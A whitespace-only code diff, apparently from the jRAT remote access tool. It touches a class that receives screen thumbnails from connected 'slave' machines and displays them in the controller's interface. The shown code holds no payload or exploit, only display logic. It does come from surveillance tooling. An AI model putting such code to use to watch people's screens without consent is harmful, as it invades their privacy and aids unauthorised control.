@@ -11,8 +11,6 @@ import pro.jrat.ui.frames.Frame;
 import pro.jrat.ui.frames.FrameInfo;
 import pro.jrat.utils.Utils;
 
-
-
 public class Packet33Thumbnail extends AbstractIncomingPacket {
 
 	private BufferedImage bufferedImage;
@@ -30,9 +28,9 @@ public class Packet33Thumbnail extends AbstractIncomingPacket {
 			frame1.panel.image = slave.getThumbnail().getImage();
 			frame1.panel.repaint();
 		}
-		
+
 		int row = Utils.getRow(slave);
-		
+
 		if (row != -1 && Frame.thumbnails) {
 			Frame.mainModel.setValueAt(slave.getThumbnail(), row, 0);
 		}
